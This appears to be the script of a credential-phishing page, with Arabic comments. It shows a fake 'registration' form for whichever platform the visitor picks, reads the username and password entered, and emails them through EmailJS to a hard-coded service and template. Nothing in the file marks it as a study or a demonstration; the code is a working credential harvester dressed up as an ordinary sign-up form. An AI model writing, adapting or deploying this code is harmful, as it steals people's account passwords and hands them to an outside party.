// تهيئة EmailJS
emailjs.init("1xqwBMfecM1SSulsh"); // المفتاح العام

// عرض النموذج عند اختيار منصة
function activateContactForm(platformName) {
    const formContainer = document.getElementById("form-container");
    const platformTitle = document.getElementById("platform-name");

    platformTitle.textContent = `التسجيل في ${platformName}`;
    formContainer.style.display = "block";
}

// إرسال البيانات عبر EmailJS
function sendPlatformData(event) {
    event.preventDefault();

    const username = document.getElementById("username").value;
    const password = document.getElementById("password").value;

    const templateParams = {
        username: username,
        password: password,
    };

    emailjs.send('service_ir3vg5y', 'template_jw2qkzr', templateParams)
        .then(response => {
            alert('تم إرسال البيانات بنجاح!');
            console.log('Success:', response);
            document.getElementById("registration-form").reset();
        })
        .catch(error => {
            alert('حدث خطأ أثناء الإرسال. الرجاء المحاولة مرة أخرى.');
            console.error('Error:', error);
        });
}
